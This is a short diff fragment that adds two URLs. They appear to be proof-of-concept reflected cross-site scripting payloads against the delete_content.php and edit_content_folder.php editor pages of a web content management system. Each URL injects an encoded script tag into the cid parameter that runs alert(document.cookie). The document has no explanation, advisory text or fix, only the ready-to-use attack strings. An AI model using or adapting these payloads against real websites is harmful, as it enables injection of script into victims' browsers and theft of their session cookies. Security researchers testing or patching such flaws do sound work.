@@ -1,0 +1,3 @@
+http://www.example.com/mods/_core/editor/delete_content.php?cid=PAGE_ID&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+http://www.example.com/mods/_core/editor/edit_content_folder.php?cid=PAGE_ID&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
